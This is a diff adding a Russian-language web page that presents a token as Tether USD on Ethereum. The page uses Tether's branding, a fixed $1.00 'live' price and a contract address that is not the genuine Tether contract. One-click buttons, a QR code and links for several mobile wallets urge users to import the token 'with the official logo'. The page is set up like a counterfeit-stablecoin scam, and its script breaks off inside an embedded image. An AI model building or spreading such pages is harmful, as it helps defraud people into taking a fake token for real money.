@@ -1,0 +1,454 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Tether USD (ERC-20) — Добавить токен в кошелек</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #061118;
+      --card-bg: rgba(10, 25, 36, 0.94);
+      --primary: #009393;
+      --primary-glow: rgba(0, 147, 147, 0.4);
+      --eth-blue: #627EEA;
+      --border: rgba(0, 147, 147, 0.35);
+      --text: #ffffff;
+      --muted: #94a3b8;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: radial-gradient(circle at 50% 12%, #0a3d32 0%, #061017 65%, var(--bg) 100%);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 32px 16px 60px;
+      -webkit-font-smoothing: antialiased;
+    }
+    .card {
+      max-width: 560px;
+      width: 100%;
+      background: var(--card-bg);
+      backdrop-filter: blur(20px);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 32px 28px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6), 0 0 45px var(--primary-glow);
+    }
+    .nav-back {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: var(--muted);
+      text-decoration: none;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 22px;
+      transition: color 0.15s;
+    }
+    .nav-back:hover { color: #fff; }
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      margin-bottom: 24px;
+    }
+    .token-logo-svg {
+      width: 78px;
+      height: 78px;
+      flex-shrink: 0;
+      filter: drop-shadow(0 6px 14px rgba(0, 0, 0, 0.5));
+    }
+    .header-text h1 {
+      font-size: 26px;
+      font-weight: 800;
+      line-height: 1.2;
+    }
+    .badge-network {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 6px;
+      background: rgba(98, 126, 234, 0.2);
+      border: 1px solid var(--eth-blue);
+      color: #9bb1ff;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 4px 12px;
+      border-radius: 20px;
+    }
+    .price-box {
+      background: rgba(5, 15, 23, 0.9);
+      border: 1px solid rgba(0, 147, 147, 0.3);
+      border-radius: 16px;
+      padding: 16px 20px;
+      margin-bottom: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .price-val {
+      font-size: 24px;
+      font-weight: 800;
+      color: #4ade80;
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .meta-box {
+      background: rgba(5, 15, 23, 0.6);
+      border-radius: 14px;
+      padding: 16px;
+      margin-bottom: 22px;
+      font-size: 13px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+    .meta-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    }
+    .meta-row:last-child { border-bottom: none; }
+    .meta-val {
+      font-family: 'JetBrains Mono', monospace;
+      color: #e2e8f0;
+      word-break: break-all;
+      text-align: right;
+    }
+    .btn-action {
+      width: 100%;
+      padding: 16px;
+      background: linear-gradient(135deg, #009393, #007070);
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 10px 25px rgba(0, 147, 147, 0.4);
+      transition: all 0.2s;
+    }
+    .btn-action:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 14px 30px rgba(0, 147, 147, 0.6);
+    }
+    .btn-copy-bar {
+      width: 100%;
+      margin-top: 10px;
+      padding: 12px;
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 12px;
+      color: #cbd5e1;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: background 0.15s;
+    }
+    .btn-copy-bar:hover { background: rgba(255, 255, 255, 0.1); }
+    .status-msg {
+      margin-top: 18px;
+      padding: 14px;
+      border-radius: 12px;
+      background: #04090d;
+      font-size: 13px;
+      font-family: 'JetBrains Mono', monospace;
+      color: #94a3b8;
+      border: 1px solid rgba(0, 147, 147, 0.25);
+      line-height: 1.5;
+    }
+    .qr-container {
+      margin-top: 24px;
+      text-align: center;
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 18px;
+      padding: 22px;
+    }
+    .qr-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 6px;
+    }
+    .qr-sub {
+      font-size: 13px;
+      color: var(--muted);
+      margin-bottom: 16px;
+      line-height: 1.4;
+    }
+    .qr-img {
+      width: 170px;
+      height: 170px;
+      border-radius: 14px;
+      border: 3px solid rgba(0, 147, 147, 0.5);
+      background: #fff;
+      padding: 8px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.5);
+    }
+    .wallets-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      margin-top: 14px;
+    }
+    .wallet-btn {
+      padding: 12px 10px;
+      border-radius: 12px;
+      font-size: 13px;
+      font-weight: 700;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: transform 0.15s, background 0.15s;
+    }
+    .wallet-btn:hover { transform: translateY(-1px); }
+    .w-metamask { background: rgba(246, 133, 27, 0.15); border: 1px solid #f6851b; color: #f6851b; }
+    .w-trust { background: rgba(51, 117, 187, 0.15); border: 1px solid #3375bb; color: #60a5fa; }
+    .w-okx { background: rgba(255, 255, 255, 0.1); border: 1px solid #fff; color: #fff; }
+    .w-coinbase { background: rgba(0, 82, 255, 0.15); border: 1px solid #0052ff; color: #70a1ff; }
+    .w-bitget { background: rgba(0, 240, 255, 0.12); border: 1px solid #00c6d7; color: #00e1f4; }
+    .w-tokenpocket { background: rgba(41, 128, 250, 0.15); border: 1px solid #2980fa; color: #93c5fd; }
+    .toast {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%) translateY(100px);
+      background: #10b981;
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 12px;
+      font-weight: 600;
+      font-size: 14px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      transition: transform 0.3s ease;
+      z-index: 1000;
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); }
+    footer {
+      margin-top: 36px;
+      text-align: center;
+      color: #475569;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <a href="index.html" class="nav-back">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
+      Главный портал (Все сети)
+    </a>
+
+    <div class="header">
+      <!-- EXACT DIAMOND TETHER LOGO WITH ETHEREUM BADGE -->
+      <svg class="token-logo-svg" viewBox="0 0 512 512" width="78" height="78">
+        <!-- Circle Background -->
+        <circle cx="242" cy="242" r="236" fill="#009393"/>
+        <!-- White Diamond Plaque -->
+        <polygon points="144,162 340,162 386,248 242,398 98,248" fill="#FFFFFF"/>
+        <!-- Tether Symbol inside Diamond -->
+        <g fill="#009393">
+          <rect x="172" y="198" width="140" height="26" rx="2"/>
+          <rect x="228" y="198" width="28" height="135" rx="2"/>
+          <ellipse cx="242" cy="266" rx="78" ry="22" fill="none" stroke="#009393" stroke-width="16"/>
+        </g>
+        <!-- Ethereum Network Badge -->
+        <g transform="translate(276, 296)">
+          <rect x="0" y="0" width="168" height="168" rx="42" fill="#0E1114" />
+          <rect x="8" y="8" width="152" height="152" rx="36" fill="#1C1E29" />
+          <g transform="translate(42, 32) scale(0.52)">
+            <polygon points="80,10 24,96 80,76" fill="#FFFFFF" opacity="0.8" />
+            <polygon points="80,10 80,76 136,96" fill="#FFFFFF" />
+            <polygon points="80,88 24,106 80,172" fill="#FFFFFF" opacity="0.8" />
+            <polygon points="80,88 80,172 136,106" fill="#FFFFFF" />
+          </g>
+        </g>
+      </svg>
+      <div class="header-text">
+        <h1>Tether USD</h1>
+        <div class="badge-network">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 4 14 12 11 20 14 12 2"/><polygon points="12 13 4 15 12 22 20 15 12 13"/></svg>
+          Ethereum Mainnet (ERC-20)
+        </div>
+      </div>
+    </div>
+
+    <div class="price-box">
+      <div>
+        <div style="font-size: 12px; color: var(--muted); margin-bottom: 2px;">Курс (CoinGecko Live):</div>
+        <div class="price-val" id="priceDisplay">$1.0000 USD</div>
+        <div style="font-size: 12px; color: #cbd5e1; margin-top: 2px;" id="priceRub">~ 80.20 RUB</div>
+      </div>
+      <div style="text-align: right;">
+        <div style="font-size: 12px; color: var(--muted); margin-bottom: 2px;">Ваш баланс:</div>
+        <div style="font-size: 18px; font-weight: 700;" id="userBal">- USDt</div>
+        <div style="font-size: 12px; color: #4ade80; margin-top: 2px;" id="userBalUsd">~ $0.00</div>
+      </div>
+    </div>
+
+    <div class="meta-box">
+      <div class="meta-row">
+        <span style="color: var(--muted);">Сеть:</span>
+        <span class="meta-val">Ethereum Mainnet (ChainID: 1)</span>
+      </div>
+      <div class="meta-row">
+        <span style="color: var(--muted);">Символ / Точность:</span>
+        <span class="meta-val">USDt / 6 decimals</span>
+      </div>
+      <div class="meta-row">
+        <span style="color: var(--muted);">Адрес контракта:</span>
+        <span class="meta-val">0x9a56E7576FF09B7C137BaC7b859205cdCBF31477</span>
+      </div>
+    </div>
+
+    <button id="addBtn" class="btn-action" onclick="executeWatchAsset()">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
+      Добавить в кошелек (1 клик с логотипом)
+    </button>
+
+    <button class="btn-copy-bar" onclick="copyContract()">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+      Скопировать адрес контракта
+    </button>
+
+    <div id="statusBox" class="status-msg">
+      Наведите камеру смартфона на QR-код ниже или выберите мобильный кошелек для мгновенного импорта:
+    </div>
+
+    <!-- QR CODE FOR INSTANT SCAN & AUTO-LOAD -->
+    <div class="qr-container">
+      <div class="qr-title">Отсканируйте QR-код камерой или кошельком</div>
+      <div class="qr-sub">Ссылка откроется в кошельке и автоматически предложит добавить Tether USD с официальным алмазным логотипом.</div>
+      <img id="qrCodeImg" class="qr-img" src="" alt="QR-код для добавления токена" />
+    </div>
+
+    <!-- WALLET CHOOSER -->
+    <div style="margin-top: 24px;">
+      <div style="font-size: 13px; font-weight: 700; color: #fff; margin-bottom: 8px;">Открыть напрямую в кошельке:</div>
+      <div class="wallets-grid">
+        <a id="mobileLinkMetaMask" class="wallet-btn w-metamask" href="#">🦊 MetaMask</a>
+        <a id="mobileLinkTrust" class="wallet-btn w-trust" href="#">🛡️ Trust Wallet</a>
+        <a id="mobileLinkOKX" class="wallet-btn w-okx" href="#">⬛ OKX Wallet</a>
+        <a id="mobileLinkCoinbase" class="wallet-btn w-coinbase" href="#">🔷 Coinbase</a>
+        <a id="mobileLinkBitget" class="wallet-btn w-bitget" href="#">🟡 Bitget</a>
+        <a id="mobileLinkTokenPocket" class="wallet-btn w-tokenpocket" href="#">📱 TokenPocket</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toast" id="toast">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
+    Адрес контракта скопирован!
+  </div>
+
+  <footer>Tether USD (ERC-20) | Развернуто в сети Ethereum Mainnet</footer>
+
+  <script>
+    const CONTRACT = "0x9a56E7576FF09B7C137BaC7b859205cdCBF31477";
+    const SYMBOL = "USDt";
+    const DECIMALS = 6;
+    
+    // Встроенный Base64 Data URI точного логотипа Tether в алмазном стиле + ETH бейдж
+    const LOGO_DATA = "data:image/png;base64,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